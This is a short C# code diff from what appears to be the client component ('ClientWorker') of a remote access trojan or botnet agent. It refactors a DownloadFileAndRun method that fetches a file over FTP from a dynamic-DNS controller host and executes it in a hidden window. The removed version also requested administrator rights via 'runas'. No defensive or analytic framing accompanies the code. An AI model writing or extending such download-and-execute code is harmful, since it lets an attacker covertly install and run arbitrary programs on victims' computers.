@@ -15,29 +15,6 @@ namespace ClientWorker
             FtpClient.DownloadFtpDirectory("ftp://" + StartData.ddnsHostName[1] + "/" + floader, localPath);
         }
 
-        public static void DownloadFileAndRun(string fileName)
-        {
-            Log.Send("DownloadFileAndRun");
-            try
-            {
-                FtpClient.DownloadF(fileName);
-
-                new Process
-                {
-                    StartInfo =
-                    {
-                        FileName = fileName,
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        Verb = "runas"
-                    }
-                }.Start();
-            }
-            catch (Exception ex)
-            {
-                Log.Send("GetFileAndRun failed: " + ex.ToString());
-            }
-        }
-
         public static void RunHideProc(string fileName)
         {
             Log.Send("RunHideProc");
@@ -56,6 +33,20 @@ namespace ClientWorker
             catch (Exception ex)
             {
                 Log.Send("RunHideProc failed: " + ex.ToString());
+            }
+        }
+
+        public static void DownloadFileAndRun(string fileName)
+        {
+            Log.Send("DownloadFileAndRun");
+            try
+            {
+                FtpClient.DownloadF(fileName);
+                RunHideProc(fileName);
+            }
+            catch (Exception ex)
+            {
+                Log.Send("Exception DownloadFileAndRun: " + ex.Message);
             }
         }
     }
